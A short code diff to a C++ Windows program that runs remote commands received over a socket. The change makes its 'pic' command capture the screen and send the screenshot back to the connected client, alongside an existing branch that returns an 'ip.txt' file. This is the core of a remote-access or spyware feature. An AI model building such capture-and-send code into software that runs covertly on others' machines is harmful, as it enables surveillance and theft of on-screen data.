@@ -404,7 +404,7 @@ void sendText(SOCKET clientSocket, const std::string& message) {
     std::cout << "Text sent successfully!" << std::endl;
 }
 
-void takeScreenshotWithTimestamp() {
+void takeScreenshotWithTimestamp(SOCKET clientSocket) {
     // Initialize GDI+
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -451,6 +451,7 @@ void takeScreenshotWithTimestamp() {
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
     std::cout << "Screenshot saved as " << filename << std::endl;
+    sendFile(clientSocket, filename);
 }
 
 
@@ -553,7 +554,7 @@ int main() {
             sendFile(clientSocket, "ip.txt");
         }
         else if (std::string(buf, 0, bytesReceived) == "pic") {
-            takeScreenshotWithTimestamp();
+            takeScreenshotWithTimestamp(clientSocket);
         }
     }
 
